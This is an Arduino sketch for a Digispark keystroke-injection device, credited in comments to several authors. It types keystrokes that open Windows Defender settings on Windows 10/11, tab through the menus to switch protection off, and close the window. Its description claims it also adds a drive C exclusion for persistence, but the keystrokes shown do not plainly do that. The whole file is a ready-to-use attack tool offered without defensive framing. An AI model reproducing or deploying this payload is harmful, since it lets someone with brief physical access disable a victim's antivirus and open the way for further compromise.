//Disabe windows defender by sending keystrokes
#include "DigiKeyboard.h"



void loop() {}

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  // Title: Disable Windows Defender
  // Author: Zero_Sploit (v1.0)
  // Updated: B33m0 (v1.1)
  // Updated: UberGuidoZ (v1.2)
  // Description: Opens security settings, disabled Defender, then adds an exception of drive C for persistence
  // Target: Windows 10/11 (Powershell)
  // Version: 1.2
  // Pause for everything to recognize and be ready
  DigiKeyboard.delay(2000);
  // Open Windows Defender Settings
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(750);
  DigiKeyboard.print(F("windowsdefender:"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // Navigate to Manage Settings
  DigiKeyboard.delay(10000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.sendKeyStroke(44);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}
